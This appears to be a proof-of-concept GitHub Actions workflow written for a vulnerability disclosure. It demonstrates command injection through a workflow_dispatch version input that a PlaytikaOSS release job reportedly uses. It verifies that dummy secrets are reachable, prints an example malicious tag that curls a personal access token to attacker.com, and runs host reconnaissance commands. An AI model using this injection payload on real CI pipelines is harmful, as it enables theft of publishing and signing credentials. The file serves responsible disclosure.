name: PoC - Secret Exfiltration via Tag Injection

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Version (injection point)"
        required: true

jobs:
  exfil-proof:
    runs-on: ubuntu-latest
    env:
      MAVEN_PASSWORD: ${{ secrets.DUMMY_OSSRH_TOKEN }}
      MAVEN_GPG_PASSPHRASE: ${{ secrets.DUMMY_GPG_KEY }}
    steps:
      - uses: actions/checkout@v6
        with:
          token: ${{ secrets.DUMMY_PAT || secrets.GITHUB_TOKEN }}

      # IDENTICAL to PlaytikaOSS release.yml vulnerable line
      - name: "Update version (VULNERABLE - identical to original)"
        run: |
          echo "Executing: ./mvnw versions:set -DnewVersion=${{ github.event.inputs.version }}"

      # Prove secrets are accessible in the injection context
      - name: "Proof: Secrets accessible in same job"
        run: |
          echo "=== SECRET ACCESSIBILITY PROOF ==="
          echo "MAVEN_PASSWORD is set: $(if [ -n \"$MAVEN_PASSWORD\" ]; then echo YES - ${#MAVEN_PASSWORD} chars; else echo NO; fi)"
          echo "MAVEN_GPG_PASSPHRASE is set: $(if [ -n \"$MAVEN_GPG_PASSPHRASE\" ]; then echo YES - ${#MAVEN_GPG_PASSPHRASE} chars; else echo NO; fi)"
          echo "GITHUB_TOKEN is set: $(if [ -n \"$GITHUB_TOKEN\" ]; then echo YES; else echo NO; fi)"
          echo ""
          echo "=== In PlaytikaOSS, these would be REAL credentials: ==="
          echo "  RELEASE_PERSONAL_ACCESS_TOKEN (GitHub PAT, repo scope)"
          echo "  GPG_PRIVATE_KEY (code signing)"
          echo "  OSSRH_TOKEN (Maven Central publishing)"
          echo ""
          echo "=== EXFILTRATION SIMULATION ==="
          echo "An attacker tag like: 1.0.0\$(curl attacker.com -d pat=\$RELEASE_PERSONAL_ACCESS_TOKEN)"
          echo "would send ALL secrets to an external server in a single HTTP request."
          echo ""
          echo "=== MACHINE PERMISSIONS (Playtika PoC Guidelines) ==="
          echo "Execute:" && id && hostname
          echo "Read:" && cat /proc/self/maps | head -3
          echo "Write:" && touch /tmp/tatsuya3817178 && ls -la /tmp/tatsuya3817178
          echo "Docker:" && groups | grep -o docker && echo "Container breakout possible"
          echo "=== END ==="
